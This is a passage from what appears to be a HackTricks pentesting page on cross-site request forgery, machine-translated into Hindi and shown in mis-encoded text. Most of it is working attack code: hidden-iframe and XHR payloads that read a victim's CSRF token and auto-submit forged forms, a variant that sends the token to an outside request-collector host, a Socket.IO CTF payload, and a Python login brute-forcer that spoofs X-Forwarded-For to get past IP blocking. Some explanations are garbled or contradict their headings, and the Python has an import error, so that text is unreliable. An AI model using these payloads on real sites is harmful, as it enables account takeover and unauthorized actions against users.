4. рдлреЙрд░реНрдо рдореЗрдВ рдЖрд╡рд╢реНрдпрдХ рдбреЗрдЯрд╛ рднрд░реЗрдВ рдФрд░ CSRF рдЯреЛрдХрди рдХреЛ рднреА рд╢рд╛рдорд┐рд▓ рдХрд░реЗрдВред
5. рдПрдЬреЗрдХреНрд╕ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдлреЙрд░реНрдо рдХреЛ рд╕рдмрдорд┐рдЯ рдХрд░реЗрдВ рдФрд░ POST рдЕрдиреБрд░реЛрдз рднреЗрдЬреЗрдВред

рдЗрд╕ рддрд░реАрдХреЗ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ, рд╣рдо рдЖрдИрдлреНрд░реЗрдо рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рд▓рдХреНрд╖рд┐рдд рд╡реЗрдмрд╕рд╛рдЗрдЯ рдХреЗ CSRF рдЯреЛрдХрди рдХреЛ рдЪреБрд░рд╛ рд╕рдХрддреЗ рд╣реИрдВ рдФрд░ рдПрдХ рдЫрд┐рдкреА рд╣реБрдИ рдлреЙрд░реНрдо рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдЙрд╕реЗ рдПрдХ POST рдЕрдиреБрд░реЛрдз рдХреЗ рд╕рд╛рде рднреЗрдЬ рд╕рдХрддреЗ рд╣реИрдВред
```markup
<form id="form1" action="http://google.com?param=VALUE" method="post" enctype="multipart/form-data">
<input type="text" name="username" value="AA">
<input type="checkbox" name="status" checked="checked">
<input id="token" type="hidden" name="token" value="" />
</form>

<script type="text/javascript">
function f1(){
x1=document.getElementById("i1");
x1d=(x1.contentWindow||x1.contentDocument);
t=x1d.document.getElementById("token").value;

document.getElementById("token").value=t;
document.getElementById("form1").submit();
}
</script>
<iframe id="i1" style="display:none" src="http://google.com?param=VALUE" onload="javascript:f1();"></iframe>
```
### **CSRF рдЯреЛрдХрди рдЪреБрд░рд╛рдПрдВ рдФрд░ рдПрдХ рдЖрдИрдлреНрд░реЗрдо рдФрд░ рдПрдХ рдлреЙрд░реНрдо рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдПрдХ POST рдЕрдиреБрд░реЛрдз рднреЗрдЬреЗрдВ**

рдПрдХ рдЖрдИрдлреНрд░реЗрдо рдФрд░ рдПрдХ рдлреЙрд░реНрдо рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ CSRF рдЯреЛрдХрди рдЪреБрд░рд╛рдиреЗ рдФрд░ рдПрдХ POST рдЕрдиреБрд░реЛрдз рднреЗрдЬрдиреЗ рдХреЗ рд▓рд┐рдП рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдХрджрдореЛрдВ рдХрд╛ рдкрд╛рд▓рди рдХрд░реЗрдВ:

1. рдПрдХ рдЖрдИрдлреНрд░реЗрдо рдмрдирд╛рдПрдВ рдФрд░ рдЙрд╕реЗ рд╡реЗрдм рдкреГрд╖реНрда рдореЗрдВ рд╕рдВрдЧрдард┐рдд рдХрд░реЗрдВред
```html
<iframe id="csrf-frame" style="display:none;"></iframe>
```
2. рдЖрдИрдлреНрд░реЗрдо рдХреЛ рд╡реЗрдм рдкреГрд╖реНрда рдореЗрдВ рд▓реЛрдб рдХрд░реЗрдВ рдФрд░ рдЙрд╕реЗ рдЯрд╛рд░рдЧреЗрдЯ рд╡реЗрдмрд╕рд╛рдЗрдЯ рдХреЗ CSRF рдкреЗрдЬ рдкрд░ рдирд┐рд░реНрджрд┐рд╖реНрдЯ рдХрд░реЗрдВред
```javascript
document.getElementById('csrf-frame').src = 'https://target-website.com/csrf-page';
```
3. рдЖрдИрдлреНрд░реЗрдо рдХреЗ рдЕрдВрджрд░ рдПрдХ рдлреЙрд░реНрдо рдмрдирд╛рдПрдВ рдФрд░ CSRF рдЯреЛрдХрди рдХреЛ рдЪреБрд░рд╛рдПрдВред
```javascript
var csrfToken = document.getElementById('csrf-frame').contentWindow.document.getElementsByName('csrf-token')[0].value;
```
4. рдЪреЛрд░реА рдХрд┐рдП рдЧрдП CSRF рдЯреЛрдХрди рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдПрдХ POST рдЕрдиреБрд░реЛрдз рднреЗрдЬреЗрдВред
```javascript
var form = document.createElement('form');
form.method = 'POST';
form.action = 'https://target-website.com/vulnerable-endpoint';
form.innerHTML = '<input type="hidden" name="csrf-token" value="' + csrfToken + '">';
document.body.appendChild(form);
form.submit();
```

рдЗрд╕ рддрдХрдиреАрдХ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдЖрдк рдПрдХ рдЖрдИрдлреНрд░реЗрдо рдФрд░ рдПрдХ рдлреЙрд░реНрдо рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ CSRF рдЯреЛрдХрди рдЪреБрд░рд╛ рд╕рдХрддреЗ рд╣реИрдВ рдФрд░ рдПрдХ POST рдЕрдиреБрд░реЛрдз рднреЗрдЬ рд╕рдХрддреЗ рд╣реИрдВред
```markup
<iframe id="iframe" src="http://google.com?param=VALUE" width="500" height="500" onload="read()"></iframe>

<script>
function read()
{
var name = 'admin2';
var token = document.getElementById("iframe").contentDocument.forms[0].token.value;
document.writeln('<form width="0" height="0" method="post" action="http://www.yoursebsite.com/check.php"  enctype="multipart/form-data">');
document.writeln('<input id="username" type="text" name="username" value="' + name + '" /><br />');
document.writeln('<input id="token" type="hidden" name="token" value="' + token + '" />');
document.writeln('<input type="submit" name="submit" value="Submit" /><br/>');
document.writeln('</form>');
document.forms[0].submit.click();
}
</script>
```
### **рдЯреЛрдХрди рдЪреБрд░рд╛рдПрдВ рдФрд░ рдЗрд╕реЗ 2 рдЖрдЗрдлреНрд░реЗрдо рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рднреЗрдЬреЗрдВ**

To steal the token and send it using 2 iframes, follow these steps:

1. Create two iframes in your malicious web page.
2. Set the source of the first iframe to the target website's login page.
3. Set the source of the second iframe to a page on your own server that will receive the stolen token.
4. Use JavaScript to automatically submit the login form in the first iframe.
5. Once the user logs in, the token will be sent to the second iframe on your server.
6. Retrieve the stolen token from the second iframe and use it for malicious purposes.

By using this technique, you can trick users into unknowingly providing their authentication token, allowing you to impersonate them and perform actions on their behalf. It is important to note that this technique may not work if the target website has implemented countermeasures such as SameSite cookies or CSRF tokens.
```markup
<script>
var token;
function readframe1(){
token = frame1.document.getElementById("profile").token.value;
document.getElementById("bypass").token.value = token
loadframe2();
}
function loadframe2(){
var test = document.getElementbyId("frame2");
test.src = "http://requestb.in/1g6asbg1?token="+token;
}
</script>

<iframe id="frame1" name="frame1" src="http://google.com?param=VALUE" onload="readframe1()"
sandbox="allow-same-origin allow-scripts allow-forms allow-popups allow-top-navigation"
height="600" width="800"></iframe>

<iframe id="frame2" name="frame2"
sandbox="allow-same-origin allow-scripts allow-forms allow-popups allow-top-navigation"
height="600" width="800"></iframe>
<body onload="document.forms[0].submit()">
<form id="bypass" name"bypass" method="POST" target="frame2" action="http://google.com?param=VALUE" enctype="multipart/form-data">
<input type="text" name="username" value="z">
<input type="checkbox" name="status" checked="">
<input id="token" type="hidden" name="token" value="0000" />
<button type="submit">Submit</button>
</form>
```
### **POSTAjax рдХреЗ рд╕рд╛рде CSRF рдЯреЛрдХрди рдЪреБрд░рд╛рдПрдВ рдФрд░ рдПрдХ рдлреЙрд░реНрдо рдХреЗ рд╕рд╛рде рдкреЛрд╕реНрдЯ рднреЗрдЬреЗрдВ**

рдПрдХ рдФрд░ рддрдХрдиреАрдХ рд╣реИ рдЬрд┐рд╕рдореЗрдВ рд╣рдо Ajax рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ CSRF рдЯреЛрдХрди рдЪреБрд░рд╛ рд╕рдХрддреЗ рд╣реИрдВ рдФрд░ рдПрдХ рдлреЙрд░реНрдо рдХреЗ рд╕рд╛рде рдкреЛрд╕реНрдЯ рднреЗрдЬ рд╕рдХрддреЗ рд╣реИрдВред рдЗрд╕ рддрдХрдиреАрдХ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рд╣рдореЗрдВ рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдХрджрдореЛрдВ рдХрд╛ рдкрд╛рд▓рди рдХрд░рдирд╛ рд╣реЛрдЧрд╛:

1. рдкрд╣рд▓реЗ, рд╣рдореЗрдВ рд╡реЗрдм рдкреЗрдЬ рдкрд░ рдореМрдЬреВрдж CSRF рдЯреЛрдХрди рдХреЛ рдЪреБрд░рд╛рдиреЗ рдХреЗ рд▓рд┐рдП рдПрдХ Ajax рдЕрдиреБрд░реЛрдз рднреЗрдЬрдирд╛ рд╣реЛрдЧрд╛ред рдЗрд╕рдХреЗ рд▓рд┐рдП, рд╣рдо рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдЬрд╛рд╡рд╛рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдХреЛрдб рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:

```javascript
var xhr = new XMLHttpRequest();
xhr.open("GET", "/get_csrf_token", true);
xhr.onreadystatechange = function() {
  if (xhr.readyState == 4 && xhr.status == 200) {
    var response = JSON.parse(xhr.responseText);
    var csrfToken = response.csrf_token;
    // CSRF рдЯреЛрдХрди рдХреЛ рдЪреБрд░рд╛ рд▓рд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ, рдЕрдм рд╣рдореЗрдВ рдЗрд╕реЗ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдПрдХ рдкреЛрд╕реНрдЯ рдЕрдиреБрд░реЛрдз рднреЗрдЬрдирд╛ рд╣реЛрдЧрд╛ред
    sendPostRequest(csrfToken);
  }
};
xhr.send();

function sendPostRequest(csrfToken) {
  var xhr = new XMLHttpRequest();
  xhr.open("POST", "/post_data", true);
  xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
  xhr.onreadystatechange = function() {
    if (xhr.readyState == 4 && xhr.status == 200) {
      console.log("рдкреЛрд╕реНрдЯ рд╕рдлрд▓рддрд╛рдкреВрд░реНрд╡рдХ рднреЗрдЬрд╛ рдЧрдпрд╛ рд╣реИ!");
    }
  };
  xhr.send("data=рдпрд╣рд╛рдВ рдЖрдкрдХрд╛ рдбреЗрдЯрд╛ рд╣реЛрдЧрд╛&csrf_token=" + csrfToken);
}
```

2. рджреВрд╕рд░реЗ рдХрджрдо рдореЗрдВ, рд╣рдореЗрдВ рд╡реЗрдм рд╕рд░реНрд╡рд░ рдкрд░ рдПрдХ рдПрдВрдбрдкреНрд╡рд╛рдЗрдВрдЯ рдмрдирд╛рдирд╛ рд╣реЛрдЧрд╛ рдЬреЛ CSRF рдЯреЛрдХрди рдХреЛ рд╡рд╛рдкрд╕ рднреЗрдЬреЗрдЧрд╛ред рдЗрд╕рдХреЗ рд▓рд┐рдП, рд╣рдореЗрдВ рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдХреЛрдб рдХреЛ рд╡реЗрдм рд╕рд░реНрд╡рд░ рдкрд░ рдЬреЛрдбрд╝рдирд╛ рд╣реЛрдЧрд╛:

```python
from flask import Flask, jsonify, request

app = Flask(__name__)

@app.route("/get_csrf_token", methods=["GET"])
def get_csrf_token():
    # CSRF рдЯреЛрдХрди рдХреЛ рдпрд╣рд╛рдВ рдЙрддреНрдкрдиреНрди рдХрд░реЗрдВ рдФрд░ рдЙрд╕реЗ рдЬрд╡рд╛рдм рдореЗрдВ рд╡рд╛рдкрд╕ рднреЗрдЬреЗрдВ
    csrf_token = generate_csrf_token()
    return jsonify({"csrf_token": csrf_token})

@app.route("/post_data", methods=["POST"])
def post_data():
    data = request.form.get("data")
    csrf_token = request.form.get("csrf_token")
    # CSRF рдЯреЛрдХрди рдХреА рд╕рддреНрдпрддрд╛ рдХреА рдЬрд╛рдВрдЪ рдХрд░реЗрдВ рдФрд░ рдбреЗрдЯрд╛ рдХреЛ рд╕рдВрдЧреНрд░рд╣реАрдд рдХрд░реЗрдВ
    if validate_csrf_token(csrf_token):
        save_data(data)
        return "рдкреЛрд╕реНрдЯ рд╕рдлрд▓рддрд╛рдкреВрд░реНрд╡рдХ рд╕рдВрдЧреНрд░рд╣реАрдд рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ!"
    else:
        return "рдЕрдорд╛рдиреНрдп CSRF рдЯреЛрдХрди!"

if __name__ == "__main__":
    app.run()
```

рдЗрд╕ рддрд░рд╣, рд╣рдо Ajax рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ CSRF рдЯреЛрдХрди рдХреЛ рдЪреБрд░рд╛ рд╕рдХрддреЗ рд╣реИрдВ рдФрд░ рдПрдХ рдлреЙрд░реНрдо рдХреЗ рд╕рд╛рде рдкреЛрд╕реНрдЯ рднреЗрдЬ рд╕рдХрддреЗ рд╣реИрдВред
```markup
<body onload="getData()">

<form id="form" action="http://google.com?param=VALUE" method="POST" enctype="multipart/form-data">
<input type="hidden" name="username" value="root"/>
<input type="hidden" name="status" value="on"/>
<input type="hidden" id="findtoken" name="token" value=""/>
<input type="submit" value="valider"/>
</form>

<script>
var x = new XMLHttpRequest();
function getData() {
x.withCredentials = true;
x.open("GET","http://google.com?param=VALUE",true);
x.send(null);
}
x.onreadystatechange = function() {
if (x.readyState == XMLHttpRequest.DONE) {
var token = x.responseText.match(/name="token" value="(.+)"/)[1];
document.getElementById("findtoken").value = token;
document.getElementById("form").submit();
}
}
</script>
```
### Socket.IO рдХреЗ рд╕рд╛рде CSRF

Socket.IO рдХреЛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ Cross-Site Request Forgery (CSRF) рдЕрдЯреИрдХ рдХреЛ рдЕрдкрдирд╛рдирд╛ рдПрдХ рдЪреБрдиреМрддреАрдкреВрд░реНрдг рдХрд╛рд░реНрдп рд╣реЛ рд╕рдХрддрд╛ рд╣реИред CSRF рдЕрдЯреИрдХ рдореЗрдВ, рд╣рдо рдПрдХ рд╡рд┐рд╢реНрд╡рд╕рдиреАрдп рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЛ рдзреЛрдЦрд╛ рджреЗрдХрд░ рдЕрдирдЪрд╛рд╣реЗ рд░реВрдк рд╕реЗ рдЙрдирдХреЗ рдирд╛рдо рдкрд░ рдЕрдиреБрд░реЛрдз рднреЗрдЬрддреЗ рд╣реИрдВред рдЗрд╕рдХреЗ рдкрд░рд┐рдгрд╛рдорд╕реНрд╡рд░реВрдк, рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЗ рдирд╛рдо рдкрд░ рдЕрдирдЪрд╛рд╣реЗ рд░реВрдк рд╕реЗ рдХреНрд░рд┐рдпрд╛рдПрдБ рд╣реЛ рд╕рдХрддреА рд╣реИрдВ, рдЬреИрд╕реЗ рдХрд┐ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЗ рдирд╛рдо рдкрд░ рдИрдореЗрд▓ рднреЗрдЬрдирд╛, рд╕рд╛рдЗрдЯ рд╕реЗ рд▓реЙрдЧрдЖрдЙрдЯ рдХрд░рдирд╛, рдпрд╛ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЗ рдирд╛рдо рдкрд░ рд╡рд┐рд╢реНрд╡рд╕рдиреАрдп рд╡реЗрдмрд╕рд╛рдЗрдЯреЛрдВ рдкрд░ рд╡рд┐рдЬрд┐рдЯ рдХрд░рдирд╛ред

Socket.IO рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ CSRF рдЕрдЯреИрдХ рдХреЛ рд░реЛрдХрдиреЗ рдХреЗ рд▓рд┐рдП, рд╣рдореЗрдВ рдПрдХ CSRF рдЯреЛрдХрди рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдирд╛ рдЪрд╛рд╣рд┐рдПред рдпрд╣ рдЯреЛрдХрди рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЗ рдмреНрд░рд╛рдЙрдЬрд╝рд░ рдореЗрдВ рд╕рдВрдЧреНрд░рд╣реАрдд рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ рдФрд░ рд╣рд░ рдЕрдиреБрд░реЛрдз рдХреЗ рд╕рд╛рде рднреЗрдЬрд╛ рдЬрд╛рддрд╛ рд╣реИред рд╕рд░реНрд╡рд░ рд╕рд╛рдЗрдб рдкрд░, рд╣рдореЗрдВ рдЗрд╕ рдЯреЛрдХрди рдХреЛ рд╕рддреНрдпрд╛рдкрд┐рдд рдХрд░рдирд╛ рдЪрд╛рд╣рд┐рдП рдФрд░ рдХреЗрд╡рд▓ рд╕рддреНрдпрд╛рдкрд┐рдд рдЯреЛрдХрди рдХреЗ рд╕рд╛рде рд╣реА рдЕрдиреБрд░реЛрдз рдХреЛ рд╕реНрд╡реАрдХрд╛рд░ рдХрд░рдирд╛ рдЪрд╛рд╣рд┐рдПред

рдпрд╣рд╛рдВ рдПрдХ рдЙрджрд╛рд╣рд░рдг рд╣реИ рдХрд┐ рдХреИрд╕реЗ рд╣рдо Socket.IO рдХреЗ рд╕рд╛рде CSRF рдЕрдЯреИрдХ рдХреЛ рд░реЛрдХ рд╕рдХрддреЗ рд╣реИрдВ:

```javascript
// рд╕рд░реНрд╡рд░ рд╕рд╛рдЗрдб
const csrfToken = generateCSRFToken();

io.on('connection', (socket) => {
  socket.on('request', (data) => {
    const { token, payload } = data;
    if (validateCSRFToken(token)) {
      // CSRF рдЯреЛрдХрди рд╕рддреНрдпрд╛рдкрд┐рдд рд╣реЛ рд░рд╣рд╛ рд╣реИ, рдЕрдиреБрд░реЛрдз рд╕реНрд╡реАрдХрд╛рд░ рдХрд░реЗрдВ
      processRequest(payload);
    } else {
      // CSRF рдЯреЛрдХрди рд╕рддреНрдпрд╛рдкрд┐рдд рдирд╣реАрдВ рд╣реЛ рд░рд╣рд╛ рд╣реИ, рдЕрдиреБрд░реЛрдз рдХреЛ рдЕрд╕реНрд╡реАрдХрд╛рд░ рдХрд░реЗрдВ
      rejectRequest();
    }
  });
});

// рдХреНрд▓рд╛рдЗрдВрдЯ рд╕рд╛рдЗрдб
const socket = io.connect();

function sendRequest(payload) {
  const token = getCSRFTokenFromLocalStorage();
  socket.emit('request', { token, payload });
}
```

рдЗрд╕ рдЙрджрд╛рд╣рд░рдг рдореЗрдВ, рд╣рдореЗрдВ рд╕рд░реНрд╡рд░ рд╕рд╛рдЗрдб рдкрд░ `generateCSRFToken` рдФрд░ `validateCSRFToken` рдлрд╝рдВрдХреНрд╢рди рдмрдирд╛рдиреЗ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реЛрдЧреАред `generateCSRFToken` рдлрд╝рдВрдХреНрд╢рди CSRF рдЯреЛрдХрди рдЙрддреНрдкрдиреНрди рдХрд░реЗрдЧрд╛ рдФрд░ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЗ рдмреНрд░рд╛рдЙрдЬрд╝рд░ рдореЗрдВ рд╕рдВрдЧреНрд░рд╣реАрдд рдХрд░реЗрдЧрд╛ред `validateCSRFToken` рдлрд╝рдВрдХреНрд╢рди CSRF рдЯреЛрдХрди рдХреЛ рд╕рддреНрдпрд╛рдкрд┐рдд рдХрд░реЗрдЧрд╛ред

рдХреНрд▓рд╛рдЗрдВрдЯ рд╕рд╛рдЗрдб рдкрд░, рд╣рдореЗрдВ `getCSRFTokenFromLocalStorage` рдлрд╝рдВрдХреНрд╢рди рдмрдирд╛рдиреЗ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реЛрдЧреА рдЬреЛ CSRF рдЯреЛрдХрди рдХреЛ рд▓реЛрдХрд▓ рд╕рдВрдЧреНрд░рд╣реАрдд рдХрд░реЗрдЧрд╛ред `sendRequest` рдлрд╝рдВрдХреНрд╢рди CSRF рдЯреЛрдХрди рдХреЗ рд╕рд╛рде рдЕрдиреБрд░реЛрдз рднреЗрдЬреЗрдЧрд╛ред

рдЗрд╕ рддрд░рд╣, рд╣рдо Socket.IO рдХреЗ рд╕рд╛рде CSRF рдЕрдЯреИрдХ рдХреЛ рд░реЛрдХ рд╕рдХрддреЗ рд╣реИрдВ рдФрд░ рдЕрдкрдиреЗ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛рдУрдВ рдХреЛ рд╕реБрд░рдХреНрд╖рд┐рдд рд░рдЦ рд╕рдХрддреЗ рд╣реИрдВред
```markup
<script src="https://cdn.jsdelivr.net/npm/socket.io-client@2/dist/socket.io.js"></script>
<script>
let socket = io('http://six.jh2i.com:50022/test');

const username = 'admin'

socket.on('connect', () => {
console.log('connected!');
socket.emit('join', {
room: username
});
socket.emit('my_room_event', {
data: '!flag',
room: username
})

});
</script>
```
## CSRF рд▓реЙрдЧрд┐рди рдмреНрд░реВрдЯ рдлреЛрд░реНрд╕

рдпрд╣ рдХреЛрдб рдПрдХ CSRF рдЯреЛрдХрди рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рд▓реЙрдЧрд┐рди рдлреЙрд░реНрдо рдХреЛ рдмреНрд░реВрдЯ рдлреЛрд░реНрд╕ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ (рдпрд╣ рдПрдХ рд╕рдВрднрд╛рд╡рд┐рдд рдЖрдИрдкреА рдмреНрд▓реИрдХрд▓рд┐рд╕реНрдЯрд┐рдВрдЧ рдХреЛ рдмрд╛рдЗрдкрд╛рд╕ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП X-Forwarded-For рд╣реИрдбрд░ рдХрд╛ рдЙрдкрдпреЛрдЧ рднреА рдХрд░ рд░рд╣рд╛ рд╣реИ):
```python
import request
import re
import random

URL = "http://10.10.10.191/admin/"
PROXY = { "http": "127.0.0.1:8080"}
SESSION_COOKIE_NAME = "BLUDIT-KEY"
USER = "fergus"
PASS_LIST="./words"

def init_session():
#Return CSRF + Session (cookie)
r = requests.get(URL)
csrf = re.search(r'input type="hidden" id="jstokenCSRF" name="tokenCSRF" value="([a-zA-Z0-9]*)"', r.text)
csrf = csrf.group(1)
session_cookie = r.cookies.get(SESSION_COOKIE_NAME)
return csrf, session_cookie

def login(user, password):
print(f"{user}:{password}")
csrf, cookie = init_session()
cookies = {SESSION_COOKIE_NAME: cookie}
data = {
"tokenCSRF": csrf,
"username": user,
"password": password,
"save": ""
}
headers = {
"X-Forwarded-For": f"{random.randint(1,256)}.{random.randint(1,256)}.{random.randint(1,256)}.{random.randint(1,256)}"
}
r = requests.post(URL, data=data, cookies=cookies, headers=headers, proxies=PROXY)
if "Username or password incorrect" in r.text:
return False
else:
print(f"FOUND {user} : {password}")
return True

with open(PASS_LIST, "r") as f:
for line in f:
login(USER, line.strip())
```
## рдЙрдкрдХрд░рдг <a href="#tools" id="tools"></a>

* [https://github.com/0xInfection/XSRFProbe](https://github.com/0xInfection/XSRFProbe)
* [https://github.com/merttasci/csrf-poc-generator](https://github.com/merttasci/csrf-poc-generator)

## рд╕рдВрджрд░реНрдн

* [https://portswigger.net/web-security/csrf](https://portswigger.net/web-security/csrf)
* [https://www.hahwul.com/2019/10/bypass-referer-check-logic-for-csrf.html](https://www.hahwul.com/2019/10/bypass-referer-check-logic-for-csrf.html)

тАЛ

<figure><img src="../.gitbook/assets/image (1) (3) (1).png" alt=""><figcaption></figcaption></figure>

**HackenProof рдХреНрд░рд┐рдкреНрдЯреЛ рдмрдЧ рдмрд╛рдЙрдВрдЯреА рдХреЗ рд▓рд┐рдП рдШрд░ рд╣реИред**

**рджреЗрд░реА рдХреЗ рдмрд┐рдирд╛ рдкреБрд░рд╕реНрдХрд╛рд░ рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ**\
HackenProof рдмрд╛рдЙрдВрдЯреА рдХреЗрд╡рд▓ рддрдм рд╢реБрд░реВ рд╣реЛрддреА рд╣реИрдВ рдЬрдм рдЙрдирдХреЗ рдЧреНрд░рд╛рд╣рдХ рдкреБрд░рд╕реНрдХрд╛рд░ рдмрдЬрдЯ рдЬрдорд╛ рдХрд░рддреЗ рд╣реИрдВред рдЖрдкрдХреЛ рдкреБрд░рд╕реНрдХрд╛рд░ рдЙрд╕ рдмрдЧ рдХреЛ рд╕рддреНрдпрд╛рдкрд┐рдд рдХрд░рдиреЗ рдХреЗ рдмрд╛рдж рдорд┐рд▓реЗрдЧрд╛ред

**рд╡реЗрдм3 рдкреЗрдВрдЯреЗрд╕реНрдЯрд┐рдВрдЧ рдореЗрдВ рдЕрдиреБрднрд╡ рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ**\
рдмреНрд▓реЙрдХрдЪреЗрди рдкреНрд░реЛрдЯреЛрдХреЙрд▓ рдФрд░ рд╕реНрдорд╛рд░реНрдЯ рдХреЙрдиреНрдЯреНрд░реИрдХреНрдЯреНрд╕ рдирдИ рдЗрдВрдЯрд░рдиреЗрдЯ рд╣реИрдВ! рдЙрдирдХреЗ рдЙрднрд░рддреЗ рджрд┐рдиреЛрдВ рдореЗрдВ рд╡реЗрдм3 рд╕реБрд░рдХреНрд╖рд╛ рдХреЛ рдорд╛рд╕реНрдЯрд░ рдХрд░реЗрдВред

**рд╡реЗрдм3 рд╣реИрдХрд░ рд▓реАрдЬреЗрдВрдб рдмрдиреЗрдВ**\
рдкреНрд░рддреНрдпреЗрдХ рд╕рддреНрдпрд╛рдкрд┐рдд рдмрдЧ рдХреЗ рд╕рд╛рде рдкреНрд░рддрд┐рд╖реНрдард╛ рдЕрдВрдХ рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ рдФрд░ рд╕рд╛рдкреНрддрд╛рд╣рд┐рдХ рд▓реАрдбрд░рдмреЛрд░реНрдб рдХреЗ рд╢реАрд░реНрд╖ рдкрд░ рд╡рд┐рдЬрдпреА рдмрдиреЗрдВред

[**HackenProof рдкрд░ рд╕рд╛рдЗрди рдЕрдк рдХрд░реЗрдВ**](https://hackenproof.com/register) рдФрд░ рдЕрдкрдиреЗ рд╣реИрдХреНрд╕ рд╕реЗ рдХрдорд╛рдИ рдХрд░рдирд╛ рд╢реБрд░реВ рдХрд░реЗрдВ!

{% embed url="https://hackenproof.com/register" %}

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>тШБя╕П HackTricks Cloud тШБя╕П</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ЁЯРж Twitter ЁЯРж</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ЁЯОЩя╕П Twitch ЁЯОЩя╕П</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ЁЯОе Youtube ЁЯОе</strong></a></summary>

* рдХреНрдпрд╛ рдЖрдк рдХрд┐рд╕реА **рд╕рд╛рдЗрдмрд░ рд╕реБрд░рдХреНрд╖рд╛ рдХрдВрдкрдиреА** рдореЗрдВ рдХрд╛рдо рдХрд░рддреЗ рд╣реИрдВ? рдХреНрдпрд╛ рдЖрдк рдЪрд╛рд╣рддреЗ рд╣реИрдВ рдХрд┐ рдЖрдкрдХреА **рдХрдВрдкрдиреА HackTricks рдореЗрдВ рд╡рд┐рдЬреНрдЮрд╛рдкрд┐рдд рд╣реЛ**? рдпрд╛ рдХреНрдпрд╛ рдЖрдкрдХреЛ **PEASS рдХреА рдирд╡реАрдирддрдо рд╕рдВрд╕реНрдХрд░рдг рдпрд╛ HackTricks рдХреЛ PDF рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░рдиреЗ рдХрд╛ рдЙрдкрдпреЛрдЧ** рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рдЪрд╛рд╣рд┐рдП? [**рд╕рджрд╕реНрдпрддрд╛ рдпреЛрдЬрдирд╛рдПрдВ**](https://github.com/sponsors/carlospolop) рдХреА рдЬрд╛рдВрдЪ рдХрд░реЗрдВ!
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) рдХреА рдЦреЛрдЬ рдХрд░реЗрдВ, рд╣рдорд╛рд░рд╛ рд╡рд┐рд╢реЗрд╖ [**NFT**](https://opensea.io/collection/the-peass-family) рд╕рдВрдЧреНрд░рд╣
* [**рдЖрдзрд┐рдХрд╛рд░рд┐рдХ PEASS & HackTricks swag**](https://peass.creator-spring.com) рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ
* [**ЁЯТм**](https://emojipedia.org/speech-balloon/) [**Discord рд╕рдореВрд╣**](https://discord.gg/hRep4RUj7f) рдпрд╛ [**рдЯреЗрд▓реАрдЧреНрд░рд╛рдо рд╕рдореВрд╣**](https://t.me/peass) рдореЗрдВ **рд╢рд╛рдорд┐рд▓** рд╣реЛрдВ рдпрд╛ рдореБрдЭреЗ **рдЯреНрд╡рд┐рдЯрд░** [**ЁЯРж**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)** рдХрд╛** рдЕрдиреБрд╕рд░рдг рдХрд░реЗрдВред**
